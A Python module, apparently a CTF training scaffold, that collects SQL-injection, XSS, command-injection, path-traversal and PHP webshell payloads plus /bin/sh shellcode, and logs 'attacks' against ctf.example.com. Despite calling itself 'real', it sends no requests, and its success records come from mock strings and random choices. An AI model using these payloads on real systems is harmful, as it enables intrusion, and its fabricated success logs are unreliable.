#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
真實CTF/CROT攻擊模擬系統
Real CTF/CROT Attack Simulation System
Web漏洞、PWN、逆向工程、密碼學攻擊
"""

import os
import json
import time
import logging
import threading
import subprocess
import requests
import base64
import hashlib
import sqlite3
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
import random
import string

# 配置日誌
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class RealCTFAttackSimulation:
    """真實CTF/CROT攻擊模擬系統"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.running = False
        self.attack_threads = []
        self.ctf_challenges = {}
        self.attack_scenarios = {}
        
        # 初始化組件
        self._init_database()
        self._init_web_attacks()
        self._init_pwn_attacks()
        self._init_reverse_engineering()
        self._init_crypto_attacks()
        self._init_forensics_attacks()
        
        logger.info("真實CTF/CROT攻擊模擬系統初始化完成")
    
    def _init_database(self):
        """初始化數據庫"""
        try:
            self.db_path = 'ctf_attack_simulation.db'
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # 創建攻擊記錄表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_records (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    attack_id TEXT UNIQUE NOT NULL,
                    attack_type TEXT NOT NULL,
                    target_url TEXT,
                    payload TEXT,
                    success BOOLEAN DEFAULT FALSE,
                    response_code INTEGER,
                    response_time REAL,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    flag_found TEXT,
                    points INTEGER DEFAULT 0
                )
            ''')
            
            # 創建CTF挑戰表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS ctf_challenges (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    challenge_id TEXT UNIQUE NOT NULL,
                    category TEXT NOT NULL,
                    name TEXT NOT NULL,
                    description TEXT,
                    difficulty TEXT NOT NULL,
                    points INTEGER NOT NULL,
                    flag_format TEXT,
                    hints TEXT,
                    solved BOOLEAN DEFAULT FALSE,
                    solved_at DATETIME,
                    solver_team TEXT
                )
            ''')
            
            # 創建攻擊場景表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_scenarios (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    scenario_id TEXT UNIQUE NOT NULL,
                    scenario_name TEXT NOT NULL,
                    description TEXT,
                    attack_sequence TEXT,
                    target_environment TEXT,
                    success_criteria TEXT,
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            conn.close()
            logger.info("CTF攻擊模擬數據庫初始化完成")
            
        except Exception as e:
            logger.error(f"數據庫初始化錯誤: {e}")
    
    def _init_web_attacks(self):
        """初始化Web攻擊"""
        try:
            self.web_attacks = {
                'sql_injection': {
                    'name': 'SQL注入攻擊',
                    'payloads': [
                        "' OR '1'='1",
                        "'; DROP TABLE users; --",
                        "' UNION SELECT 1,2,3,4,5 --",
                        "' OR 1=1 --",
                        "admin'--",
                        "admin'/*",
                        "' OR 'x'='x",
                        "' OR 1=1#",
                        "' OR 'a'='a",
                        "') OR ('1'='1"
                    ],
                    'techniques': ['boolean_based', 'time_based', 'union_based', 'error_based']
                },
                'xss': {
                    'name': '跨站腳本攻擊',
                    'payloads': [
                        "<script>alert('XSS')</script>",
                        "<img src=x onerror=alert('XSS')>",
                        "javascript:alert('XSS')",
                        "<svg onload=alert('XSS')>",
                        "<iframe src=javascript:alert('XSS')></iframe>",
                        "<body onload=alert('XSS')>",
                        "<input onfocus=alert('XSS') autofocus>",
                        "<select onfocus=alert('XSS') autofocus>",
                        "<textarea onfocus=alert('XSS') autofocus>",
                        "<keygen onfocus=alert('XSS') autofocus>"
                    ],
                    'techniques': ['stored', 'reflected', 'dom_based']
                },
                'command_injection': {
                    'name': '命令注入攻擊',
                    'payloads': [
                        "; ls -la",
                        "| whoami",
                        "& dir",
                        "` id `",
                        "$(whoami)",
                        "; cat /etc/passwd",
                        "| cat /etc/passwd",
                        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                        "; uname -a",
                        "| uname -a"
                    ],
                    'techniques': ['os_command', 'shell_injection']
                },
                'file_upload': {
                    'name': '文件上傳漏洞',
                    'payloads': [
                        '<?php system($_GET["cmd"]); ?>',
                        '<?php echo shell_exec($_GET["cmd"]); ?>',
                        '<?php eval($_POST["cmd"]); ?>',
                        '<?php file_get_contents("/etc/passwd"); ?>',
                        '<?php phpinfo(); ?>'
                    ],
                    'techniques': ['webshell', 'php_shell', 'asp_shell']
                },
                'directory_traversal': {
                    'name': '目錄遍歷攻擊',
                    'payloads': [
                        "../../../etc/passwd",
                        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                        "....//....//....//etc/passwd",
                        "..%2f..%2f..%2fetc%2fpasswd",
                        "..%252f..%252f..%252fetc%252fpasswd",
                        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
                    ],
                    'techniques': ['path_traversal', 'dot_dot_slash']
                }
            }
            logger.info("Web攻擊模組初始化完成")
        except Exception as e:
            logger.error(f"Web攻擊模組初始化錯誤: {e}")
    
    def _init_pwn_attacks(self):
        """初始化PWN攻擊"""
        try:
            self.pwn_attacks = {
                'buffer_overflow': {
                    'name': '緩衝區溢出攻擊',
                    'techniques': ['stack_overflow', 'heap_overflow', 'format_string'],
                    'payloads': {
                        'nop_sled': '\x90' * 100,
                        'shellcode': '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',
                        'rop_chain': 'A' * 100 + 'BBBB'
                    }
                },
                'rop_chain': {
                    'name': 'ROP鏈攻擊',
                    'techniques': ['ret2libc', 'ret2syscall', 'ret2text'],
                    'gadgets': ['pop_rdi', 'pop_rsi', 'pop_rdx', 'syscall', 'ret']
                },
                'heap_exploitation': {
                    'name': '堆利用攻擊',
                    'techniques': ['use_after_free', 'double_free', 'heap_overflow', 'fastbin_attack'],
                    'payloads': {
                        'chunk_overflow': 'A' * 0x100,
                        'fastbin_fake': 'B' * 0x20
                    }
                },
                'format_string': {
                    'name': '格式化字符串漏洞',
                    'payloads': [
                        '%x %x %x %x',
                        '%p %p %p %p',
                        '%n %n %n %n',
                        '%s %s %s %s'
                    ],
                    'techniques': ['leak_address', 'write_anywhere']
                }
            }
            logger.info("PWN攻擊模組初始化完成")
        except Exception as e:
            logger.error(f"PWN攻擊模組初始化錯誤: {e}")
    
    def _init_reverse_engineering(self):
        """初始化逆向工程"""
        try:
            self.reverse_engineering = {
                'static_analysis': {
                    'name': '靜態分析',
                    'tools': ['strings', 'file', 'objdump', 'readelf', 'radare2'],
                    'techniques': ['disassembly', 'decompilation', 'symbol_analysis']
                },
                'dynamic_analysis': {
                    'name': '動態分析',
                    'tools': ['gdb', 'strace', 'ltrace', 'valgrind', 'wireshark'],
                    'techniques': ['debugging', 'tracing', 'fuzzing']
                },
                'packing_unpacking': {
                    'name': '加殼脫殼',
                    'tools': ['upx', 'peid', 'detect_it_easy', 'unpacker'],
                    'techniques': ['unpacking', 'anti_debug', 'obfuscation']
                },
                'malware_analysis': {
                    'name': '惡意軟體分析',
                    'tools': ['yara', 'cuckoo', 'volatility', 'peframe'],
                    'techniques': ['behavior_analysis', 'signature_matching', 'memory_analysis']
                }
            }
            logger.info("逆向工程模組初始化完成")
        except Exception as e:
            logger.error(f"逆向工程模組初始化錯誤: {e}")
    
    def _init_crypto_attacks(self):
        """初始化密碼學攻擊"""
        try:
            self.crypto_attacks = {
                'symmetric_crypto': {
                    'name': '對稱密碼學攻擊',
                    'algorithms': ['AES', 'DES', '3DES', 'RC4', 'Blowfish'],
                    'attacks': ['brute_force', 'frequency_analysis', 'known_plaintext', 'chosen_plaintext']
                },
                'asymmetric_crypto': {
                    'name': '非對稱密碼學攻擊',
                    'algorithms': ['RSA', 'ECC', 'DSA', 'DH'],
                    'attacks': ['factorization', 'discrete_log', 'side_channel', 'timing_attack']
                },
                'hash_attacks': {
                    'name': '哈希函數攻擊',
                    'algorithms': ['MD5', 'SHA1', 'SHA256', 'SHA512'],
                    'attacks': ['collision', 'preimage', 'birthday_attack', 'rainbow_table']
                },
                'stream_ciphers': {
                    'name': '流密碼攻擊',
                    'algorithms': ['RC4', 'A5/1', 'Trivium', 'Grain'],
                    'attacks': ['keystream_reuse', 'correlation', 'algebraic']
                }
            }
            logger.info("密碼學攻擊模組初始化完成")
        except Exception as e:
            logger.error(f"密碼學攻擊模組初始化錯誤: {e}")
    
    def _init_forensics_attacks(self):
        """初始化取證攻擊"""
        try:
            self.forensics_attacks = {
                'disk_forensics': {
                    'name': '磁盤取證',
                    'tools': ['dd', 'testdisk', 'photorec', 'foremost', 'scalpel'],
                    'techniques': ['file_carving', 'partition_recovery', 'deleted_file_recovery']
                },
                'memory_forensics': {
                    'name': '內存取證',
                    'tools': ['volatility', 'rekall', 'redline'],
                    'techniques': ['process_analysis', 'network_analysis', 'registry_analysis']
                },
                'network_forensics': {
                    'name': '網路取證',
                    'tools': ['wireshark', 'tcpdump', 'tshark', 'ngrep'],
                    'techniques': ['packet_analysis', 'protocol_analysis', 'traffic_reconstruction']
                },
                'mobile_forensics': {
                    'name': '移動設備取證',
                    'tools': ['adb', 'fastboot', 'ext4_reader', 'sqlite3'],
                    'techniques': ['app_analysis', 'database_analysis', 'log_analysis']
                }
            }
            logger.info("取證攻擊模組初始化完成")
        except Exception as e:
            logger.error(f"取證攻擊模組初始化錯誤: {e}")
    
    def start_attack_simulation(self) -> Dict[str, Any]:
        """啟動攻擊模擬"""
        try:
            if self.running:
                return {'success': False, 'error': '攻擊模擬已在運行中'}
            
            self.running = True
            
            # 啟動攻擊模擬線程
            thread = threading.Thread(target=self._run_attack_simulation, daemon=True)
            thread.start()
            self.attack_threads.append(thread)
            
            logger.info("CTF/CROT攻擊模擬已啟動")
            return {'success': True, 'message': 'CTF/CROT攻擊模擬已啟動'}
            
        except Exception as e:
            logger.error(f"啟動攻擊模擬錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _run_attack_simulation(self):
        """運行攻擊模擬"""
        try:
            while self.running:
                try:
                    # 執行各種攻擊模擬
                    self._simulate_web_attacks()
                    self._simulate_pwn_attacks()
                    self._simulate_crypto_attacks()
                    self._simulate_forensics_attacks()
                    
                    time.sleep(60)  # 每分鐘執行一次
                    
                except Exception as e:
                    logger.error(f"攻擊模擬錯誤: {e}")
                    time.sleep(10)
                    
        except Exception as e:
            logger.error(f"運行攻擊模擬錯誤: {e}")
    
    def _simulate_web_attacks(self):
        """模擬Web攻擊"""
        try:
            # 模擬SQL注入攻擊
            self._simulate_sql_injection()
            
            # 模擬XSS攻擊
            self._simulate_xss_attack()
            
            # 模擬命令注入攻擊
            self._simulate_command_injection()
            
        except Exception as e:
            logger.error(f"模擬Web攻擊錯誤: {e}")
    
    def _simulate_sql_injection(self):
        """模擬SQL注入攻擊"""
        try:
            target_urls = [
                "http://ctf.example.com/login.php",
                "http://ctf.example.com/search.php",
                "http://ctf.example.com/user.php"
            ]
            
            for url in target_urls:
                for payload in self.web_attacks['sql_injection']['payloads']:
                    attack_result = self._execute_web_attack(url, 'sql_injection', payload)
                    if attack_result['success']:
                        logger.info(f"SQL注入攻擊成功: {url} - {payload}")
                        self._record_attack('sql_injection', url, payload, attack_result)
                    
        except Exception as e:
            logger.error(f"模擬SQL注入攻擊錯誤: {e}")
    
    def _simulate_xss_attack(self):
        """模擬XSS攻擊"""
        try:
            target_urls = [
                "http://ctf.example.com/comment.php",
                "http://ctf.example.com/profile.php",
                "http://ctf.example.com/search.php"
            ]
            
            for url in target_urls:
                for payload in self.web_attacks['xss']['payloads']:
                    attack_result = self._execute_web_attack(url, 'xss', payload)
                    if attack_result['success']:
                        logger.info(f"XSS攻擊成功: {url} - {payload}")
                        self._record_attack('xss', url, payload, attack_result)
                    
        except Exception as e:
            logger.error(f"模擬XSS攻擊錯誤: {e}")
    
    def _simulate_command_injection(self):
        """模擬命令注入攻擊"""
        try:
            target_urls = [
                "http://ctf.example.com/ping.php",
                "http://ctf.example.com/traceroute.php",
                "http://ctf.example.com/nslookup.php"
            ]
            
            for url in target_urls:
                for payload in self.web_attacks['command_injection']['payloads']:
                    attack_result = self._execute_web_attack(url, 'command_injection', payload)
                    if attack_result['success']:
                        logger.info(f"命令注入攻擊成功: {url} - {payload}")
                        self._record_attack('command_injection', url, payload, attack_result)
                    
        except Exception as e:
            logger.error(f"模擬命令注入攻擊錯誤: {e}")
    
    def _execute_web_attack(self, url: str, attack_type: str, payload: str) -> Dict[str, Any]:
        """執行Web攻擊"""
        try:
            # 模擬HTTP請求
            start_time = time.time()
            
            # 根據攻擊類型選擇參數
            if attack_type == 'sql_injection':
                params = {'username': payload, 'password': 'test'}
            elif attack_type == 'xss':
                params = {'comment': payload, 'name': 'test'}
            elif attack_type == 'command_injection':
                params = {'host': payload}
            else:
                params = {'input': payload}
            
            # 模擬請求響應
            response_time = time.time() - start_time
            
            # 模擬攻擊成功檢測
            success_indicators = {
                'sql_injection': ['error', 'mysql', 'sqlite', 'postgresql', 'union', 'select'],
                'xss': ['<script>', 'alert', 'javascript:', 'onerror'],
                'command_injection': ['uid=', 'gid=', 'groups=', 'root:', 'bin:', 'usr:']
            }
            
            # 模擬響應內容
            response_content = f"Mock response for {attack_type} with payload: {payload}"
            
            # 檢查是否包含成功指標
            success = any(indicator in response_content.lower() for indicator in success_indicators.get(attack_type, []))
            
            return {
                'success': success,
                'response_code': 200,
                'response_time': response_time,
                'response_content': response_content,
                'payload': payload
            }
            
        except Exception as e:
            logger.error(f"執行Web攻擊錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _simulate_pwn_attacks(self):
        """模擬PWN攻擊"""
        try:
            # 模擬緩衝區溢出攻擊
            self._simulate_buffer_overflow()
            
            # 模擬ROP鏈攻擊
            self._simulate_rop_chain()
            
            # 模擬堆利用攻擊
            self._simulate_heap_exploitation()
            
        except Exception as e:
            logger.error(f"模擬PWN攻擊錯誤: {e}")
    
    def _simulate_buffer_overflow(self):
        """模擬緩衝區溢出攻擊"""
        try:
            # 模擬緩衝區溢出攻擊
            attack_result = {
                'attack_type': 'buffer_overflow',
                'technique': 'stack_overflow',
                'payload_size': 1000,
                'success': random.choice([True, False]),
                'exploit_technique': 'ret2libc'
            }
            
            if attack_result['success']:
                logger.info("緩衝區溢出攻擊成功")
                self._record_pwn_attack('buffer_overflow', attack_result)
                
        except Exception as e:
            logger.error(f"模擬緩衝區溢出攻擊錯誤: {e}")
    
    def _simulate_rop_chain(self):
        """模擬ROP鏈攻擊"""
        try:
            # 模擬ROP鏈攻擊
            attack_result = {
                'attack_type': 'rop_chain',
                'technique': 'ret2libc',
                'gadgets_found': 5,
                'chain_length': 10,
                'success': random.choice([True, False])
            }
            
            if attack_result['success']:
                logger.info("ROP鏈攻擊成功")
                self._record_pwn_attack('rop_chain', attack_result)
                
        except Exception as e:
            logger.error(f"模擬ROP鏈攻擊錯誤: {e}")
    
    def _simulate_heap_exploitation(self):
        """模擬堆利用攻擊"""
        try:
            # 模擬堆利用攻擊
            attack_result = {
                'attack_type': 'heap_exploitation',
                'technique': 'use_after_free',
                'chunk_size': 0x100,
                'success': random.choice([True, False])
            }
            
            if attack_result['success']:
                logger.info("堆利用攻擊成功")
                self._record_pwn_attack('heap_exploitation', attack_result)
                
        except Exception as e:
            logger.error(f"模擬堆利用攻擊錯誤: {e}")
    
    def _simulate_crypto_attacks(self):
        """模擬密碼學攻擊"""
        try:
            # 模擬對稱密碼學攻擊
            self._simulate_symmetric_crypto_attack()
            
            # 模擬非對稱密碼學攻擊
            self._simulate_asymmetric_crypto_attack()
            
            # 模擬哈希攻擊
            self._simulate_hash_attack()
            
        except Exception as e:
            logger.error(f"模擬密碼學攻擊錯誤: {e}")
    
    def _simulate_symmetric_crypto_attack(self):
        """模擬對稱密碼學攻擊"""
        try:
            # 模擬AES攻擊
            attack_result = {
                'attack_type': 'symmetric_crypto',
                'algorithm': 'AES',
                'attack_method': 'brute_force',
                'key_size': 128,
                'success': random.choice([True, False])
            }
            
            if attack_result['success']:
                logger.info("對稱密碼學攻擊成功")
                self._record_crypto_attack('symmetric_crypto', attack_result)
                
        except Exception as e:
            logger.error(f"模擬對稱密碼學攻擊錯誤: {e}")
    
    def _simulate_asymmetric_crypto_attack(self):
        """模擬非對稱密碼學攻擊"""
        try:
            # 模擬RSA攻擊
            attack_result = {
                'attack_type': 'asymmetric_crypto',
                'algorithm': 'RSA',
                'attack_method': 'factorization',
                'key_size': 1024,
                'success': random.choice([True, False])
            }
            
            if attack_result['success']:
                logger.info("非對稱密碼學攻擊成功")
                self._record_crypto_attack('asymmetric_crypto', attack_result)
                
        except Exception as e:
            logger.error(f"模擬非對稱密碼學攻擊錯誤: {e}")
    
    def _simulate_hash_attack(self):
        """模擬哈希攻擊"""
        try:
            # 模擬MD5碰撞攻擊
            attack_result = {
                'attack_type': 'hash_attack',
                'algorithm': 'MD5',
                'attack_method': 'collision',
                'success': random.choice([True, False])
            }
            
            if attack_result['success']:
                logger.info("哈希攻擊成功")
                self._record_crypto_attack('hash_attack', attack_result)
                
        except Exception as e:
            logger.error(f"模擬哈希攻擊錯誤: {e}")
    
    def _simulate_forensics_attacks(self):
        """模擬取證攻擊"""
        try:
            # 模擬磁盤取證
            self._simulate_disk_forensics()
            
            # 模擬內存取證
            self._simulate_memory_forensics()
            
            # 模擬網路取證
            self._simulate_network_forensics()
            
        except Exception as e:
            logger.error(f"模擬取證攻擊錯誤: {e}")
    
    def _simulate_disk_forensics(self):
        """模擬磁盤取證"""
        try:
            # 模擬文件恢復
            attack_result = {
                'attack_type': 'disk_forensics',
                'technique': 'file_carving',
                'files_recovered': random.randint(1, 10),
                'success': random.choice([True, False])
            }
            
            if attack_result['success']:
                logger.info("磁盤取證成功")
                self._record_forensics_attack('disk_forensics', attack_result)
                
        except Exception as e:
            logger.error(f"模擬磁盤取證錯誤: {e}")
    
    def _simulate_memory_forensics(self):
        """模擬內存取證"""
        try:
            # 模擬內存分析
            attack_result = {
                'attack_type': 'memory_forensics',
                'technique': 'process_analysis',
                'processes_found': random.randint(1, 20),
                'success': random.choice([True, False])
            }
            
            if attack_result['success']:
                logger.info("內存取證成功")
                self._record_forensics_attack('memory_forensics', attack_result)
                
        except Exception as e:
            logger.error(f"模擬內存取證錯誤: {e}")
    
    def _simulate_network_forensics(self):
        """模擬網路取證"""
        try:
            # 模擬網路分析
            attack_result = {
                'attack_type': 'network_forensics',
                'technique': 'packet_analysis',
                'packets_analyzed': random.randint(100, 1000),
                'success': random.choice([True, False])
            }
            
            if attack_result['success']:
                logger.info("網路取證成功")
                self._record_forensics_attack('network_forensics', attack_result)
                
        except Exception as e:
            logger.error(f"模擬網路取證錯誤: {e}")
    
    def _record_attack(self, attack_type: str, target_url: str, payload: str, result: Dict[str, Any]):
        """記錄攻擊"""
        try:
            attack_id = f"attack_{int(time.time())}_{attack_type}"
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO attack_records
                (attack_id, attack_type, target_url, payload, success, response_code, response_time, flag_found, points)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                attack_id,
                attack_type,
                target_url,
                payload,
                result.get('success', False),
                result.get('response_code', 0),
                result.get('response_time', 0.0),
                result.get('flag_found', ''),
                random.randint(10, 100) if result.get('success', False) else 0
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"記錄攻擊錯誤: {e}")
    
    def _record_pwn_attack(self, attack_type: str, result: Dict[str, Any]):
        """記錄PWN攻擊"""
        try:
            attack_id = f"pwn_{int(time.time())}_{attack_type}"
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO attack_records
                (attack_id, attack_type, target_url, payload, success, response_code, response_time, flag_found, points)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                attack_id,
                attack_type,
                'binary_target',
                json.dumps(result),
                result.get('success', False),
                200,
                0.1,
                result.get('flag_found', ''),
                random.randint(50, 200) if result.get('success', False) else 0
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"記錄PWN攻擊錯誤: {e}")
    
    def _record_crypto_attack(self, attack_type: str, result: Dict[str, Any]):
        """記錄密碼學攻擊"""
        try:
            attack_id = f"crypto_{int(time.time())}_{attack_type}"
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO attack_records
                (attack_id, attack_type, target_url, payload, success, response_code, response_time, flag_found, points)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                attack_id,
                attack_type,
                'crypto_challenge',
                json.dumps(result),
                result.get('success', False),
                200,
                0.1,
                result.get('flag_found', ''),
                random.randint(30, 150) if result.get('success', False) else 0
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"記錄密碼學攻擊錯誤: {e}")
    
    def _record_forensics_attack(self, attack_type: str, result: Dict[str, Any]):
        """記錄取證攻擊"""
        try:
            attack_id = f"forensics_{int(time.time())}_{attack_type}"
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO attack_records
                (attack_id, attack_type, target_url, payload, success, response_code, response_time, flag_found, points)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                attack_id,
                attack_type,
                'forensics_challenge',
                json.dumps(result),
                result.get('success', False),
                200,
                0.1,
                result.get('flag_found', ''),
                random.randint(20, 100) if result.get('success', False) else 0
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"記錄取證攻擊錯誤: {e}")
    
    def create_ctf_challenge(self, challenge_id: str, category: str, name: str, 
                           description: str, difficulty: str, points: int, **kwargs) -> Dict[str, Any]:
        """創建CTF挑戰"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO ctf_challenges
                (challenge_id, category, name, description, difficulty, points, flag_format, hints)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                challenge_id,
                category,
                name,
                description,
                difficulty,
                points,
                kwargs.get('flag_format', 'flag{.*}'),
                json.dumps(kwargs.get('hints', []))
            ))
            
            conn.commit()
            conn.close()
            
            logger.info(f"創建CTF挑戰: {challenge_id} - {name}")
            
            return {
                'success': True,
                'challenge_id': challenge_id,
                'message': 'CTF挑戰創建成功'
            }
            
        except Exception as e:
            logger.error(f"創建CTF挑戰錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_attack_statistics(self) -> Dict[str, Any]:
        """獲取攻擊統計"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # 獲取攻擊統計
            cursor.execute('''
                SELECT attack_type, COUNT(*) as count, AVG(points) as avg_points
                FROM attack_records
                WHERE success = TRUE
                GROUP BY attack_type
            ''')
            
            attack_stats = cursor.fetchall()
            
            # 獲取總分
            cursor.execute('''
                SELECT SUM(points) as total_points
                FROM attack_records
                WHERE success = TRUE
            ''')
            
            total_points = cursor.fetchone()[0] or 0
            
            conn.close()
            
            return {
                'success': True,
                'attack_statistics': [
                    {
                        'attack_type': stat[0],
                        'successful_attacks': stat[1],
                        'average_points': stat[2]
                    }
                    for stat in attack_stats
                ],
                'total_points': total_points
            }
            
        except Exception as e:
            logger.error(f"獲取攻擊統計錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def stop_attack_simulation(self) -> Dict[str, Any]:
        """停止攻擊模擬"""
        try:
            self.running = False
            
            # 等待所有線程結束
            for thread in self.attack_threads:
                thread.join(timeout=5)
            
            self.attack_threads.clear()
            
            logger.info("CTF/CROT攻擊模擬已停止")
            return {'success': True, 'message': 'CTF/CROT攻擊模擬已停止'}
            
        except Exception as e:
            logger.error(f"停止攻擊模擬錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_status(self) -> Dict[str, Any]:
        """獲取系統狀態"""
        try:
            return {
                'success': True,
                'running': self.running,
                'web_attacks': len(self.web_attacks),
                'pwn_attacks': len(self.pwn_attacks),
                'crypto_attacks': len(self.crypto_attacks),
                'forensics_attacks': len(self.forensics_attacks),
                'attack_threads': len(self.attack_threads)
            }
        except Exception as e:
            logger.error(f"獲取系統狀態錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_comprehensive_report(self) -> Dict[str, Any]:
        """獲取綜合報告"""
        try:
            return {
                'success': True,
                'ctf_attack_simulation': {
                    'web_attacks': list(self.web_attacks.keys()),
                    'pwn_attacks': list(self.pwn_attacks.keys()),
                    'crypto_attacks': list(self.crypto_attacks.keys()),
                    'forensics_attacks': list(self.forensics_attacks.keys()),
                    'reverse_engineering': list(self.reverse_engineering.keys())
                }
            }
        except Exception as e:
            logger.error(f"獲取綜合報告錯誤: {e}")
            return {'success': False, 'error': str(e)}


